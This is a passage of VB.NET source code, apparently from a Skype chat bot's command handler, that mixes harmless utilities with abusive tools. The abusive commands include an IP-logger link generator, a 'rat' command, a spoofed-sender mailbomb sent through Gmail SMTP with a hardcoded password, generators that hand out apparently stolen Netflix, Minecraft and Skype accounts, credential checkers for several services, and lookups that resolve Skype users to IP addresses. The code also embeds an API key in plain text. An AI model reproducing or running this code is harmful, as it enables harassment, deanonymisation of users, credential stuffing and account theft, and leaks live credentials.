            If command.StartsWith("buy") Then
                msg.Chat.SendMessage(My.Settings.buy)
                Exit Sub
            End If
            'BUY END
            'LMGTFY START
            If command = "lmgtfy" Then msg.Chat.SendMessage("Right Syntax: " & trigger & "lmgtfy <text>")
            If command.StartsWith("lmgtfy ") Then
                Dim shrt As ChatMessage = msg.Chat.SendMessage("Initializing...")
                AddSwagToMSG(shrt, shorten("lmgtfy.com/?q=" & command.Replace("lmgtfy ", "")))
            End If
            'LMGTFY END
            'SHORTEN START
            If command = "shorten" Then msg.Chat.SendMessage("Right Syntax: " & trigger & "shorten <url>")
            If command.StartsWith("shorten ") Then
                Dim shrt As ChatMessage = msg.Chat.SendMessage("Initializing...")
                AddSwagToMSG(shrt, shorten(command.Replace("shorten ", "")))
            End If
            'SHORTEN END
            'WHOIS START
            If command = "whois" Then msg.Chat.SendMessage("Right Syntax: " & trigger & "whois <url>")
            If command.StartsWith("whois ") Then
                Dim shrt As ChatMessage = msg.Chat.SendMessage("Initializing...")
                Dim w As New WebClient
                w.Proxy = Nothing
                AddSwagToMSG(shrt, paste(w.DownloadString("http://api.hackertarget.com/whois/?q=" & command.Replace("whois ", "").Replace("http://", "").Replace("https://", "").Replace("www.", "").Replace("/", ""))))
            End If
            'WHOIS END
            'NMAP START
            If command = "nmap" Then msg.Chat.SendMessage("Right Syntax: " & trigger & "nmap <ip>")
            If command.StartsWith("nmap ") Then
                Dim shrt As ChatMessage = msg.Chat.SendMessage("Initializing...")
                Dim w As New WebClient
                w.Proxy = Nothing
                AddSwagToMSG(shrt, paste(w.DownloadString("http://api.hackertarget.com/nmap/?q=" & command.Replace("nmap ", "").Replace("http://", "").Replace("https://", "").Replace("www.", "").Replace("/", ""))))
            End If
            'NMAP END
            'TROLL START
            If command = "troll" Then msg.Chat.SendMessage("Right Syntax: " & trigger & "troll <somename>")
            If command.StartsWith("troll ") Then
                Dim shrt As ChatMessage = msg.Chat.SendMessage("Initializing...")
                AddSwagToMSG(shrt, shorten("http://www.megalook.ru/schild.swf?namee=" & command.Replace("troll ", "")))
            End If
            'TROLL END
            'IPLOGGER START
            If command = "iplog" Then msg.Chat.SendMessage("Right Syntax: " & trigger & "iplog <help/parameters>")
            If command.StartsWith("iplog ") Then
                Dim usr As String = msg.Sender.Handle
                If IsPremium(usr) Then
                Else
                    msg.Chat.SendMessage("This command is for premium or higher only, I'm sorry!")
                    Exit Sub
                End If
                Dim cmd As String = command.Replace("iplog ", "")
                If cmd = "help" Then
                    Dim iphelp As String = "----------IPLOG PANEL----------" & vbNewLine & "!iplog clearlogs -- Clears the IPLogs" & vbNewLine & "!iplog create -- How to create an iplogger" & vbNewLine & "!iplog getlink -- Gets your iplogger link" & vbNewLine & "!iplog getlogs -- Gets the ip logs for you." & vbNewLine & "!iplog help -- Shows This Menu." & vbNewLine & "----------IPLOG PANEL----------"
                    msg.Chat.SendMessage(iphelp)
                    Exit Sub
                End If
                Dim ipl As ChatMessage = msg.Chat.SendMessage("Initializing...")
                Dim w As New WebClient
                w.Proxy = Nothing
                If cmd.StartsWith("create") Then
                    If cmd = "create" Then AddSwagToMSG(ipl, "Right Syntax: " & trigger & "iplog create <redirecting site>")
                    If cmd.StartsWith("create ") Then
                        Dim ur As String = cmd.Replace("create ", "")
                        If ur.StartsWith("http") Then  Else ur = "http://" & ur
                        ipl.Body = "Creating new IPLogger..."
                        ipl.Body = "Your IPLogger sites are:"
                        ipl.Body = ipl.Body & vbNewLine & "Creating..."
                        Dim req As String = w.DownloadString("http://apis.skypebot.ga/apis/newiplog.php?skype=" & usr & "&url=" & ur & "&auth=True")
                        Dim newuri As String = "http://apis.skypebot.ga/apis/?skp=" & usr & "&act=True"
                        ipl.Body = "Your IPLogger sites are:" & vbNewLine & newuri & vbNewLine & "Creating..." & vbNewLine & "Creating..." & vbNewLine & "Feel free to use any shortener on these uris!"
                        Dim shorturi As String = shorten(newuri)
                        ipl.Body = "Your IPLogger sites are:" & vbNewLine & newuri & vbNewLine & shorturi & vbNewLine & "Creating..." & vbNewLine & "Feel free to use any shortener on these uris!"
                        ipl.Body = "Your IPLogger sites are:" & vbNewLine & newuri & vbNewLine & shorturi & paste2(newuri) & vbNewLine & "Feel free to use any shortener on these uris!"
                    End If
                    Exit Sub
                End If
                If cmd = "getlink" Then
                    ipl.Body = "Creating new IPLogger..."
                    ipl.Body = "Your IPLogger sites are:"
                    ipl.Body = ipl.Body & vbNewLine & "Receiving..."
                    Thread.Sleep("1000")
                    Dim newuri As String = "http://apis.skypebot.ga/apis/?skp=" & usr & "&act=True"
                    ipl.Body = "Your IPLogger sites are:" & vbNewLine & newuri & vbNewLine & "Receiving..." & vbNewLine & "Feel free to use any shortener on these uris!"
                    ipl.Body = "Your IPLogger sites are:" & vbNewLine & newuri & vbNewLine & shorten(newuri) & vbNewLine & "Feel free to use any shortener on these uris!"
                    Exit Sub
                End If
                If cmd = "getlogs" Then
                    AddSwagToMSG(ipl, "Receiving...")
                    Dim ip As String = w.DownloadString("http://apis.skypebot.ga/apis/getips.php?skype=" & usr & "&auth=True").Replace("<br>", vbNewLine)
                    Dim ips() As String = ip.Split(vbNewLine)
                    Dim msg2s As String = ""
                    For i = 0 To ips.Length - 1
                        ips(i) = (ips(i).Replace("|", " Time: ").Replace("&", "IP: ").Replace(vbNewLine, "")).Replace(vbNewLine, "")
                        msg2s = msg2s & ips(i).Replace(vbNewLine, "")
                    Next
                    If Not msg2s.Contains("IP: ") Then msg2s = "No available logs!"
                    ipl.Body = msg2s
                    Exit Sub
                End If
                If cmd = "clearlogs" Then
                    AddSwagToMSG(ipl, "Clearing logs...")
                    w.DownloadString("http://apis.skypebot.ga/apis/clearlog.php?skype=" & usr & "&auth=True")
                    AddSwagToMSG(ipl, "Cleared!")
                    Exit Sub
                End If
                ipl.Body = ""
            End If
            'IPLOGGER END
            'RAT START
            If command = "rat" Then msg.Chat.SendMessage("Right Syntax: " & trigger & "rat <help/parameters>")
            If command.StartsWith("rat ") Then
                Dim arguments As String = command.Remove(0, 4)
                If command.StartsWith("rat help") Then
                    msg.Chat.SendMessage(My.Settings.rathelp)
                    Exit Sub
                End If

                If command.StartsWith("rat tos") Then
                    msg.Chat.SendMessage(My.Settings.rattos)
                    Exit Sub
                End If
                Dim newmsg As ChatMessage = msg.Chat.SendMessage("Ratting...")
                AddSwagToMSG(newmsg, Rat(arguments, msg.Sender.Handle))
            End If
            'RAT END
            'NOTEPAD START
            If command = "notepad" Then msg.Chat.SendMessage("Right Syntax: " & trigger & "notepad <help/parameters>")
            If command.StartsWith("notepad ") Then
                Dim usr As String = msg.Sender.Handle
                Dim cmd As String = command.Replace("notepad ", "")
                If cmd = "help" Then
                    Dim iphelp As String = "----------NOTEPAD PANEL----------" & vbNewLine & "!notepad clear -- Clears your notepad" & vbNewLine & "!notepad get -- get your notepad text" & vbNewLine & "!notepad help -- Shows This Menu." & vbNewLine & "!notepad set <text> -- sets your notepad text" & vbNewLine & "----------NOTEPAD PANEL----------"
                    msg.Chat.SendMessage(iphelp)
                    Exit Sub
                End If
                Dim ipl As ChatMessage = msg.Chat.SendMessage("Initializing...")
                Dim w As New WebClient
                w.Proxy = Nothing
                If cmd = "get" Then
                    Dim la As String = w.DownloadString("http://apis.skypebot.ga/apis/notepad.php?skype=" & usr & "&auth=True")
                    If la = "" Or la = " " Then la = "No notepad setted!"
                    AddSwagToMSG(ipl, la)
                ElseIf cmd.StartsWith("set ") Then
                    cmd = cmd.Replace("set ", "")
                    Dim qdsfmdkqjf As String = w.DownloadString("http://apis.skypebot.ga/apis/notepad.php?skype=" & usr & "&msg=" & cmd & "&auth=True")
                    AddSwagToMSG(ipl, "Message Set!")
                ElseIf cmd.StartsWith("clear") Then
                    Dim qdfjm As String = w.DownloadString("http://apis.skypebot.ga/apis/notepad.php?skype=" & usr & "&msg=No notepad setted!" & "&auth=True")
                    AddSwagToMSG(ipl, "Cleared!")
                Else
                    AddSwagToMSG(ipl, "Invalid command.")
                End If
            End If
            'NOTEPAD END
            'RTD/DICE START
            If command = "rtd" Or command = "dice" Then
                Dim Rol As ChatMessage = msg.Chat.SendMessage("Rolling dice 1...")
                Dim int1 As Integer = dice()
                Thread.Sleep(1000)
                Rol.Body = "Rolling dice 2..."
                Dim int2 As Integer = dice()
                Thread.Sleep(1000)
                Rol.Body = "Depending your price based on results..."
                Dim full As Integer = int1 + int2
                Dim win As String
                Select Case full
                    Case 12
                        win = "Altough this is the highest you can get, you won nothing!"
                    Case 11
                        win = "You are awesome!"
                    Case 10
                        win = "You won administrator rights on the bot!"
                    Case 9
                        win = "Throw this once more, and you'll get banned!"
                    Case 8
                        win = "You won a free steam game! Click here to redeem: http://gg.gg/FreeSteamGameSkypeBot"
                    Case 7
                        win = "You won basicly nothing!"
                    Case 6
                        win = "You won a picture of yourself: " & shorten("http://www.megalook.ru/schild.swf?namee=" & Skypattach.User(msg.Sender.Handle).FullName)
                    Case 5
                        win = "You won 5 pennies, ask your mom to redeem them!"
                    Case 4
                        win = "You lost!"
                    Case 3
                        win = "Best person of the world!"
                    Case 2
                        win = "You won bragging rights!"
                    Case 1
                        win = "You won an empty brick of milk"
                    Case Else
                        win = "You won some knowledge: Did you know !mailbomb is a command?"
                End Select
                Rol.Body = "You threw " & full & " (" & int1 & " + " & int2 & ")" & vbNewLine & win

            End If
            'RTD/DICE END
            'PING START
            If command = "ping" Then msg.Chat.SendMessage("Right Syntax: " & trigger & "ping <ip> <times>")
            If command.StartsWith("ping ") Then

                Dim ping As ChatMessage = msg
                Dim pingmsg As ChatMessage = msg.Chat.SendMessage("Initializing ping...")
                Dim t As String = ping.Body.Replace("ping ", "").Replace("!", "")
                Dim q() As String = t.Split(" ")
                Try
                    Dim l As String = q(0)
                    l = q(1)
                Catch exz As Exception
                    AddSwagToMSG(pingmsg, "Recheck your syntax! (!help ping)")
                End Try
                If q.Length >= 2 Then
                Else
                    AddSwagToMSG(pingmsg, "You didn't enter all fields! !help ping for more info!")
                    Exit Sub
                End If
                If q(0).Contains(".") Then
                Else
                    AddSwagToMSG(pingmsg, "Invalid IP!")
                    Exit Sub
                End If
                Dim myProcess As New Process()
                Dim myProcessStartInfo As New ProcessStartInfo("ping")
                If IsNumeric(q(1)) = True Then
                    If IsAdmin(msg.Sender.Handle) Then
                        GoTo r
                    End If
                    If q(1) > 50 And IsUltimate(msg.Sender.Handle) Then
                        q(1) = 50
                        GoTo r
                    End If
                    If q(1) > 25 And IsPremium(msg.Sender.Handle) Then
                        q(1) = 25
                        GoTo r
                    End If
                    If q(1) > 10 And IsNormalUser(msg.Sender.Handle) Then
                        q(1) = 10
                    End If
                Else
                    AddSwagToMSG(pingmsg, "ERROR: You entered an invalid number, try to swap the number and ip!")
                    Exit Sub
                End If
r:
                myProcessStartInfo.Arguments = q(0) & " -l 1 -n " & q(1) * 2
                myProcessStartInfo.UseShellExecute = False
                myProcessStartInfo.RedirectStandardOutput = True
                myProcessStartInfo.CreateNoWindow = True
                myProcess.StartInfo = myProcessStartInfo
                myProcess.Start()
                Dim myStreamReader As StreamReader = myProcess.StandardOutput
test:
                Dim lol As String = myStreamReader.ReadLine.ToString.Replace(": bytes=1 time=", " with ").Replace(" TTL=", " and TLL = ").Replace("Reply from ", "")
                Dim loly As String = "Reply from " & lol
                If Not lol.Contains("with") Then loly = "Please wait..."
                If lol.Contains("timed") Then loly = "Request timed out."
                If lol.Contains("host") Then
                    AddSwagToMSG(pingmsg, "Invalid host.")
                    GoTo roo
                End If
                If lol.Contains("Minimum") Then
                    AddSwagToMSG(pingmsg, "Done, " & lol.Replace("    ", ""))
                    GoTo roo
                End If
                pingmsg.Body = loly
                If myStreamReader.ReadLine = ("") Then
                    Exit Sub
                Else : GoTo Test
                End If
roo:
                Exit Sub

            End If
            'PING END
            'MD5 START
            If command = "md5" Then msg.Chat.SendMessage("Right Syntax: " & trigger & "md5 <fromtext>")
            If command.StartsWith("md5 ") Then
                Dim w As New WebClient
                Dim md5Hash As MD5 = MD5.Create()
                Dim ms As ChatMessage = msg.Chat.SendMessage("Encoding...")
                Dim hash As String = GetMd5Hash(md5Hash, command.Remove(0, 4))
                AddSwagToMSG(ms, hash)
                w.Proxy = Nothing
                Try
                    w.DownloadString("http://apis.skypebot.ga/apis/md5.php?type=hash&md=" & hash)
                Catch
                End Try
            End If
            'MD5 END
            'MD5CRACK START
            If command = "md5crack" Then msg.Chat.SendMessage("Right Syntax: " & trigger & "md5crack <hash>")
            If command.StartsWith("md5crack ") Then
                Dim w As New WebClient
                Dim ms As ChatMessage = msg.Chat.SendMessage("Decoding...")
                Dim hash As String = command.Remove(0, 9)
                w.Proxy = Nothing
                Dim res As String = w.DownloadString("http://apis.skypebot.ga/apis/md5.php?type=crack&md=" & hash)
                AddSwagToMSG(ms, res)
            End If
            'MD5CRACK END
            'TRANSLATE START
            If command = "translate" Then msg.Chat.SendMessage("Right Syntax: " & trigger & "translate <from/detect> <to> <text>")
            If command.StartsWith("translate ") Then
                Dim translate As ChatMessage = msg.Chat.SendMessage("Translating...")
                Dim args() As String = command.Replace("translate ", "").Split(" ")
                Dim froom As String = args(0)
                Dim too As String = args(1)
                Dim message As String = ""
                For i = 2 To args.Length - 1
                    message = message & " " & args(i)
                Next
                If froom = "detect" Then
                    Dim w As New WebClient
                    w.Proxy = Nothing
                    Dim json As String = w.DownloadString("https://translate.yandex.net/api/v1.5/tr.json/detect?key=trnsl.1.1.20141215T135708Z.ba81e2e1e88ceb3b.01c0238e50401659ba7225b414ed017ee7f523ab&text=" & message.Replace(" ", "+"))

                    Dim endres As String
                    If json.Contains("200") Then
                        endres = json.Replace(My.Settings.prf2, "").Replace(My.Settings.prf3, "")
                    Else
                        endres = "Error"
                    End If
                    AddSwagToMSG(translate, translator(endres, too, message))
                Else
                    AddSwagToMSG(translate, translator(froom, too, message))
                End If
            End If
            'TRANSLATE END
            'CURRENCY START
            If command = "currency" Then msg.Chat.SendMessage("Right Syntax: " & trigger & "currency <from> <to> <amount>")
            If command.StartsWith("currency ") Then
                Dim w As New WebClient
                w.Proxy = Nothing
                Dim values() As String = command.Replace("currency ", "").Split(" ")
                Dim fromz As String = values(0)
                Dim too As String = values(1)
                Dim ammount As String = values(2)
                Dim curr As ChatMessage = msg.Chat.SendMessage("Initializing...")
                Dim result As String = w.DownloadString("http://apis.skypebot.ga/apis/currency.php?from=" & fromz.Replace("€", "EUR").Replace("$", "USD").Replace("£", "GBP").ToUpper & "&to=" & too.Replace("€", "EUR").Replace("$", "USD").Replace("£", "GBP").ToUpper & "&amount=" & ammount.Replace(",", "."))
                AddSwagToMSG(curr, result & " " & too.Replace("€", "EUR").Replace("$", "USD").Replace("£", "GBP").ToUpper)
            End If
            'CURRENCY END
            'NETFLIX START
            If command = "netflix" Then
                Dim mc As ChatMessage = msg.Chat.SendMessage("Getting a new netflix account...")
                Dim w As New WebClient
                Dim res As String = POST("http://apis.skypebot.ga/apis/gen.php?account=Netflix&auth=max", "h=True")
                Try
                    If IsPremium(msg.Sender.Handle) Then
                    Else
                        msg.Chat.SendMessage("Command is only for premium members!")
                        Exit Sub
                    End If
qqz:
                    w.Proxy = Nothing

                    AddSwagToMSG(mc, "Found one!, Checking if the account is working...")
                    Dim creds() As String = res.Split(":")
                    Dim pass As String = creds(1)
                    Dim user As String = creds(0)
                    Dim work As String = Nfcheck(user, pass)
                    '  If work = "1" Then
                    GoTo fqz

                    'ElseIf work = "0" Then
                    'AddSwagToMSG(mc, "Found an account but not working... Retrying...")
                    'Thread.Sleep(2000)
                    'GoTo qqz
                    'Else
                    'AddSwagToMSG(mc, res & vbNewLine & "Not checked!")
                    'Exit Sub
                    'End If
fqz:
                    AddSwagToMSG(mc, res & vbNewLine & "Don't leech!")

                Catch ex As Exception
                    AddSwagToMSG(mc, res & vbNewLine & "Don't leech!")
                End Try

            End If
            'NETFLIX END
            'MINECRAFT START
            If command = "minecraft" Then
                Dim mc As ChatMessage = msg.Chat.SendMessage("Getting a new minecraft account...")
                Dim res As String = POST("http://skypebot.ga/apis/apis/mcgen5553.php", "h=True")
                Try
                    If IsPremium(msg.Sender.Handle) Then
                    Else
                        msg.Chat.SendMessage("Command is only for premium members!")
                        Exit Sub
                    End If

qq:
                    Dim w As New WebClient
                    w.Proxy = Nothing

                    AddSwagToMSG(mc, "Found one!, Checking if the account is working...")
                    Dim chkapi As String = "http://apis.skypebot.ga/apis/mccheck.php?user=[user]&pass=[pass]"
                    Dim creds() As String = res.Split(":")
                    Dim pass As String = creds(1)
                    Dim user As String = creds(0)
                    ' If w.DownloadString(chkapi.Replace("[user]", user).Replace("[pass]", pass)).ToLower.Contains("working") Then
                    ' GoTo fq
                    'Else
                    'AddSwagToMSG(mc, "Found an account but not working... Retrying...")
                    'Thread.Sleep(2000)
                    'GoTo qq
                    'End If
fq:
                    AddSwagToMSG(mc, res & vbNewLine & "Don't leech!")
                Catch ex As Exception
                    AddSwagToMSG(mc, res & " -- UNCHECKED")
                End Try
            End If
            'MINECRAFT END
            'SKYPE START
            If command.StartsWith("skype") Then
                Dim w As New WebClient
                w.Proxy = Nothing
                Dim wz As ChatMessage = msg.Chat.SendMessage("Gathering account...")
                AddSwagToMSG(wz, w.DownloadString("http://skypebot.ga/apis/apis/skype.php"))
            End If
            'SKYPE END
            'CALC START
            If command = "calc" Then msg.Chat.SendMessage("Right Syntax: " & trigger & "calc <expression> OR !calc help")
            If command = "calc help" Then msg.Chat.SendMessage(My.Settings.calc)
            If command.StartsWith("calc ") Then
                Dim calc As ChatMessage = msg.Chat.SendMessage("Calculating at a much higher speed then you do...")
                If command = "calc help" Then Exit Sub
                Try
                    If command.Contains("^") Then
                        msg.Chat.SendMessage("We can't do that :c")
                        Exit Sub
                    End If
                    Dim res As String = Evaluator1.Eval(command.Replace("!", "").Replace("calc ", "")).ToString
                    AddSwagToMSG(calc, res)
                Catch exr As Exception
                    msg.Chat.SendMessage("We can't do that :c")
                    msg.Chat.SendMessage(paste("Host: " & Skypattach.CurrentUserHandle & vbNewLine & "Sender: " & msg.Sender.Handle & vbNewLine & "Cmd: " & msg.Body & vbNewLine & "Error: " & exr.ToString, "Error!"))
                End Try
            End If
            'CALC END
            'DNS START
            If command = "dns" Then msg.Chat.SendMessage("Right Syntax: " & trigger & "dns <domain>")
            If command.StartsWith("dns ") Then
                Dim dnsmsg As ChatMessage = msg.Chat.SendMessage("Initializing...")
                Try
                    Dim myIPHostEntry As IPHostEntry = Dns.Resolve(command.Replace("dns ", ""))
                    Dim myIPAddresses() As IPAddress = myIPHostEntry.AddressList
                    Dim myIPAddress As IPAddress
                    dnsmsg.Body = "Dns records:"
                    For Each myIPAddress In myIPAddresses

                        dnsmsg.Body = dnsmsg.Body & vbNewLine & myIPAddress.ToString

                    Next
                Catch exe As Exception
                    If exe.ToString.ToLower.Contains("no such host is known") Then
                        AddSwagToMSG(dnsmsg, "Invalid host.")
                    End If
                End Try
            End If
            'DNS END
            'CREATEG START
            If command.StartsWith("createg") Then
                Dim w As ChatMessage = msg.Chat.SendMessage("Creating...")
                AddSwagToMSG(w, "Unable to create group, do /createmoderatedchat and add everyone you want there, that'll work!")
            End If
            'CREATEG END
            'CHECK START
            If command = "check" Then msg.Chat.SendMessage("Right Syntax: " & trigger & "check <help/arguments>")
            If command.StartsWith("check ") Then
                Dim cmd As String = command.Replace("check ", "")
                If cmd = "help" Then msg.Chat.SendMessage("----------CHECK PANEL----------" & vbNewLine & "Doesn't support spaces in passwords!" & vbNewLine & "!check gmail <mail> <password> -- Checks if a gmail acc is working!" & vbNewLine & "!check mc <user/mail> <password> -- Checks if a minecraft account is working" & vbNewLine & "!check nf <mail> <password> -- Checks if a netflix account is working" & vbNewLine & "!check yt <mail> <password> -- Checks if a youtube account is working!" & vbNewLine & "----------CHECK PANEL----------")
                Dim w As New WebClient
                w.Proxy = Nothing
                cmd = cmd.Replace(":", " ")
                Dim chkapi As String = ""
                If cmd.StartsWith("gmail ") Then
                    Dim checker As ChatMessage = msg.Chat.SendMessage("Checking...")
                    chkapi = "http://apis.skypebot.ga/apis/gmail.php?mail=[user]&pass=[pass]"
                    Dim creds() As String = cmd.Replace("mc ", "").Split(" ")
                    Dim pass As String = creds(1)
                    Dim user As String = creds(0)
                    If Not w.DownloadString(chkapi.Replace("[user]", user).Replace("[pass]", pass)).ToLower.Contains("doesn't ") Then AddSwagToMSG(checker, "This account is working!") Else AddSwagToMSG(checker, "This account isn't working, please recheck it!")
                End If
                If cmd.StartsWith("mc ") Then
                    Dim checker As ChatMessage = msg.Chat.SendMessage("Checking...")
                    chkapi = "http://apis.skypebot.ga/apis/mccheck.php?user=[user]&pass=[pass]"
                    Dim creds() As String = cmd.Replace("mc ", "").Split(" ")
                    Dim pass As String = creds(1)
                    Dim user As String = creds(0)
                    If w.DownloadString(chkapi.Replace("[user]", user).Replace("[pass]", pass)).ToLower.Contains("working") Then AddSwagToMSG(checker, "This account is working!") Else AddSwagToMSG(checker, "This account isn't working, please recheck it!")
                End If
                If cmd.StartsWith("yt ") Then
                    Dim checker As ChatMessage = msg.Chat.SendMessage("Checking...")
                    chkapi = "http://apis.skypebot.ga/apis/yt.php?mail=[user]&pass=[pass]"
                    Dim creds() As String = cmd.Replace("yt ", "").Split(" ")
                    Dim pass As String = creds(1)
                    Dim user As String = creds(0)
                    If Not w.DownloadString(chkapi.Replace("[user]", user).Replace("[pass]", pass)).ToLower.Contains("doesn't ") Then AddSwagToMSG(checker, "This account is working!") Else AddSwagToMSG(checker, "This account isn't working, please recheck it!")
                End If
                If cmd.StartsWith("nf ") Then
                    Dim checker As ChatMessage = msg.Chat.SendMessage("Checking...")
                    Dim creds() As String = cmd.Replace("nf ", "").Split(" ")
                    Dim pass As String = creds(1)
                    Dim user As String = creds(0)
                    If Nfcheck(user, pass) = "1" Then AddSwagToMSG(checker, "This account is working!") Else AddSwagToMSG(checker, "This account isn't working, please recheck it!")
                End If
            End If
            'CHECK END
            'MAIL2SKYPE START
            If command = "mail2skype" Then msg.Chat.SendMessage("Right Syntax: " & trigger & "mail2skype <mail>")
            If command.StartsWith("mail2skype ") Then
                Dim m2s As ChatMessage = msg.Chat.SendMessage("Initializing...")
                Dim cmd As String = command.Replace("mail2skype ", "")
                AddSwagToMSG(m2s, "Getting skypename...")
                Dim w As New Net.WebClient
                w.Proxy = Nothing
                Dim skypen As String = POST("http://apis.skypebot.ga/apis/mail2skype.php", "auth=sb&u=" & cmd)
                If skypen = "" Then skypen = "No results found."
                AddSwagToMSG(m2s, skypen.Replace(" | ", ", "))
            End If
            'MAIL2SKYPE END
            'MAIL2IP START
            If command = "mail2ip" Then msg.Chat.SendMessage("Right Syntax: " & trigger & "mail2ip <mail>")
            If command.StartsWith("mail2ip ") Then
                Dim m2s As ChatMessage = msg.Chat.SendMessage("Initializing...")
                Dim cmd As String = command.Replace("mail2ip ", "")
                AddSwagToMSG(m2s, "Getting skypename...")
                Dim w As New Net.WebClient
                w.Proxy = Nothing
                Dim skypename As String = POST("http://apis.skypebot.ga/apis/mail2skype.php", "auth=sb&u=" & cmd).Replace(" | ", " ")
                If skypename = "" Then
                    AddSwagToMSG(m2s, "No results found!")
                End If
                m2s.Body = "Resolving..."
                If skypename.Contains(" ") Then
                    Dim ips() As String = skypename.Split(" ")
                    Dim result As String = ""
                    For i = 0 To ips.Length - 1
                        m2s.Body = result & "Result " & i + 1 & ": " & "Resolving..." & "; " & "Resolving..." & "; " & "Resolving..."
                        Dim ip1 As String = Resolve1(ips(i))
                        m2s.Body = result & "Result " & i + 1 & ": " & ip1 & "; " & "Resolving..." & "; " & "Resolving..."
                        Dim ip2 As String = Resolve2(ips(i))
                        m2s.Body = result & "Result " & i + 1 & ": " & ip1 & "; " & ip2 & "; " & "Resolving..."
                        Dim cachedz As String = Cached(ips(i))
                        m2s.Body = result & "Result " & i + 1 & ": " & ip1 & "; " & ip2 & "; " & cachedz
                        result = m2s.Body & vbNewLine
                    Next
                Else
                    Dim endresult As String = ""
                    Dim rez As String = ""
                    Dim resolveip As String = skypename
                    m2s.Body = "Resolver 1: " & "Resolving..." & vbNewLine & "Resolver 2: " & "Resolving..." & vbNewLine & "Cached IPs: " & "Resolving..."
                    endresult = Resolve1(resolveip)
                    If My.Settings.whitelist.Contains(endresult) Then
                        endresult = "IP of this user has been whitelisted! (or API is down)"
                    End If
                    If endresult = "error" Then endresult = "Failed!"
                    rez = "Resolver 1: " & endresult & vbNewLine & "Resolver 2: "
                    m2s.Body = rez & "Resolving..." & vbNewLine & "Cached IPs: " & "Resolving..."
                    endresult = Resolve2(resolveip)
                    If My.Settings.whitelist.Contains(endresult) Then
                        endresult = "IP of this user has been whitelisted! (or API is down)"
                    End If
                    If endresult = "error" Then endresult = "Failed!"
                    rez = rez & endresult & vbNewLine & "Cached IPs: "
                    m2s.Body = rez & "Resolving..."
                    endresult = Cached(resolveip)
                    If My.Settings.whitelist.Contains(endresult) Then
                        endresult = "IP of this user has been whitelisted! (or API is down)"
                    End If
                    If endresult = "error" Then endresult = "Failed!"
                    m2s.Body = rez & endresult
                    Exit Sub
                End If
            End If
            'MAIL2IP END
            'MAILBOMB START
            If command = "mailbomb" Then msg.Chat.SendMessage("Right Syntax: " & trigger & "mailbomb <times> <email> <spoofmail> <msg>")
            If command.StartsWith("mailbomb ") Then
                Dim mb As ChatMessage = msg.Chat.SendMessage("Initializing...")
                Dim cmd As String = command.Replace("mailbomb ", "")
                Dim d() As String = cmd.Split(" ")
                Dim email As String = ""
                Dim spoof As String = ""
                Dim tosend As String = ""
                Try
                    email = d(1)
                    spoof = d(2)
                    tosend = d(3)
                Catch exy As Exception
                    AddSwagToMSG(mb, "Recheck your syntax (!help mailbomb)")
                End Try
                If Not email.Contains("@") Or Not email.Contains(".") Or Not email.Length >= 6 Then
                    AddSwagToMSG(mb, "ERROR: Invalid email!")
                    Exit Sub
                End If
                If Not tosend.Length >= 1 Then
                    AddSwagToMSG(mb, "ERROR: Please enter a longer message!")
                    Exit Sub
                End If
                AddSwagToMSG(mb, "Making MSG...")
                If IsNumeric(d(0)) = True Then
                    If IsAdmin(msg.Sender.Handle) Then
                        GoTo raa
                    End If
                    If d(0) > 25 And IsUltimate(msg.Sender.Handle) Then
                        d(0) = 25
                        GoTo raa
                    End If
                    If d(0) > 10 And IsPremium(msg.Sender.Handle) Then
                        d(0) = 10
                        GoTo raa
                    End If
                    If IsNormalUser(msg.Sender.Handle) Then
                        AddSwagToMSG(mb, "Non upgraded users are not able to use this, see !buy or contact the owner.")
                        Exit Sub
                    End If
                Else
                    AddSwagToMSG(mb, "ERROR: You entered an invalid number, try to swap the number and msg!")
                    Exit Sub
                End If
raa:
                For a = 4 To d.Length - 1
                    tosend = tosend & " " & d(a)
                Next

                Dim mail As New MailMessage()
                Dim smtp As New SmtpClient
                If Not email.Contains("aol.com") Then
                    mail.From = New MailAddress(d(2), d(2))
                Else
                    mail.From = New MailAddress("lesleydk.ldk@gmail.com", d(2).Replace("@", " ").Replace(".", " "))
                End If
                mail.To.Add(email)
                mail.Body = tosend
                smtp.Host = "smtp.gmail.com"
                smtp.Port = 587
                smtp.EnableSsl = True
                smtp.Credentials = New System.Net.NetworkCredential("lesleydk.ldk@gmail.com", "aqlekccogegkksro")
                For i = 0 To d(0) - 1
                    mb.Body = "Sending MSG " & i + 1 & "/" & d(0) & "."
                    mail.Subject = d(3) & "... " & i + 1
                    smtp.Send(mail)
                Next
                AddSwagToMSG(mb, "#MailBombed")
            End If
            'MAILBOMB END
            'IP2S START
            If command = "ip2s" Then msg.Chat.SendMessage("Right Syntax: " & trigger & "ip2s <ip>")
            If command.StartsWith("ip2s ") Then
                Dim cmd As String = command.Replace("ip2s ", "")
                Dim ipts As New WebClient
                ipts.Proxy = Nothing
                Dim lol As ChatMessage = msg.Chat.SendMessage("Initializing...")
                ipts.Headers.Add(HttpRequestHeader.Referer, "http://api.c99.nl/cmd/")
                Dim l As String = ipts.DownloadString("http://api.c99.nl/ip2skype.php?key=skypebotje123&ip=" & cmd)
                AddSwagToMSG(lol, l)
                Exit Sub
            End If
            'IP2S END
            'NAMEINFO START
            If command = "nameinfo" Then msg.Chat.SendMessage("Right Syntax: " & trigger & "nameinfo <firstname> <last name>")
            If command.StartsWith("nameinfo ") Then
                Dim nameinfo As ChatMessage = msg.Chat.SendMessage("Searching...")
                Dim w As New WebClient
                w.Proxy = Nothing
                Dim names() As String = command.Replace("nameinfo ", "").Split(" ")
                Dim Firstname As String = names(0)
                Dim Lastname As String = names(1)
                For i = 2 To names.Length - 1
                    Lastname = Lastname & names(i)
                Next
                Dim res As String = w.DownloadString("http://api.icndb.com/jokes/random?firstName=" & Firstname & "&lastName=" & Lastname)
                If res.Contains("success") Then
                    AddSwagToMSG(nameinfo, Decodehtml(Regex.Match(res, My.Settings.regexnameinfo, RegexOptions.IgnoreCase).Value.ToString.Replace(My.Settings.prf6, "").Replace("""" & ",", "")))
                Else
                    AddSwagToMSG(nameinfo, "Error.")
                End If
                Exit Sub
            End If
            'NAMEINFO END
            'CRAWL START
            If command = "crawl" Then msg.Chat.SendMessage("Right Syntax: " & trigger & "crawl <page>")
            If command.StartsWith("crawl ") Then
                Dim crawler As String = command.Replace("crawl ", "").Replace(" ", "")
                Dim crawl As ChatMessage = msg.Chat.SendMessage("Crawling...")
                AddSwagToMSG(crawl, "Crawling...")
                Dim w As New WebClient
                w.Proxy = Nothing
                Dim res As String = paste("------------------------" & vbNewLine & w.DownloadString("http://api.hackertarget.com/pagelinks/?q=" & crawler).Replace(" ", "%20").Replace("  ", "%20%20") & "------------------------", "Crawl of " & crawler)
                AddSwagToMSG(crawl, res)
            End If
            'CRAWL END
            'GEO START
